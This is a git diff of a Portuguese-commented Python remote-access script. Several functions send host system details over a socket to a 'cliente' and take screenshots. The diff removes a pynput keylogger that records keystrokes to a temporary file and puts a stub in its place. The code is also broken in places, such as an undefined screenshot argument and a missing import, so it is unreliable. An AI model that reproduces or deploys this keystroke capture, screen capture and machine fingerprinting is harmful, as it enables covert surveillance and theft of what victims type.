@@ -1,5 +1,8 @@
 import socket, platform, os
 from pynput.keyboard import Key, Listener
+import pygame
+
+# ========= FUNCOES DE DESCOBERTA =========
 
 def detalhes_da_maquina(cliente):
     mensagem = "\nSistema: {}\nNó: {}\nRelease: {}\nVersão: {}\nBits do processador: {}".format(platform.system(),
@@ -13,28 +16,10 @@ def detalhes_do_python(cliente):
     platform.python_build())
     cliente.send(mensagem.encode())
 
-# ====== KEYLOGGER ========
-
-def on_press(key):
-    arquivo = open('key.txt','a')
-    arquivo.write(key)
-    arquivo.close()
-    arquivo = open('key.txt','r')
-    quantidade = len(arquivo.readlines())
-    if(quantidade >= 10):
-        return False
+# ========= FUNCOES DO KEYLOGGER =========
 
 def keylogger(cliente):
-    arquivo = open('key.txt','w')
-    arquivo.close()
-    with Listener(on_press = on_press) as listener:
-        listener.start()
-    arquivo = open('key.txt','r')
-    mensagem = arquivo.readlines()
-    arquivo.close()
-    os.remove('key.txt')
-
-# ====== KEYLOGGER ========
+    possibilidades = ['a','b','c','d','e','f','g']
 
 def screenshot(cliente):
     fig = pyautogui.screenshot(r)
